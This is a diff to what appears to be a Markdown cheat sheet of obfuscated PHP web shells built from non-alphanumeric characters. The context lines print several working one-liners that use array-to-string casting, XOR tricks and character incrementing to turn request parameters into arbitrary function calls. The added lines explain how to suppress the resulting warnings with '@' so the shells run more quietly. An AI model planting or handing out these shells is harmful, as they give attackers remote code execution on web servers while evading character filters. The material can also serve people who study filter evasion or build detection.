@@ -103,6 +103,11 @@ Some version mix methods to be able to create working shells.
 <?=$_=[]..1;$_=$_[1].$_[3].$_[3].$_[3].$_[4]^-1.2.-1;$$_[0]($$_[1]);
 ```
 
+The error can be suppressed by adding an `@` to the wanted query part which does the typecasting.
+```php
+<?=@$_=[]..1;...
+```
+
 ## Infinite result into string
 
 **GET**
@@ -133,6 +138,8 @@ Some version mix methods to be able to create working shells.
 <?=$_=[]._;$_=_.($_[3].$_[4].$_[3].$_[3]^1625.._);$$_[0]($$_[1]);
 ```
 
+For error suppression the same mechanism as in `Array into String (will throw warnings)` described can be used.
+
 ---
 
 ## Char Increment
@@ -148,6 +155,8 @@ Some version mix methods to be able to create working shells.
 ```php
 <?=[$_=([]..1)[0],++$_,++$_,$__=$_++,++$_,++$_,++$_,$__.=++$_,++$_,++$_,++$_,++$_,++$_,++$_,++$_,++$_,++$_,$_=$__.++$_,$__=$_(95).$_(80).$_(79).$_(83).$_(84),$$__[0]($$__[1])];
 ```
+
+For error suppression the same mechanism as in `Array into String (will throw warnings)` described can be used.
 
 ---
 
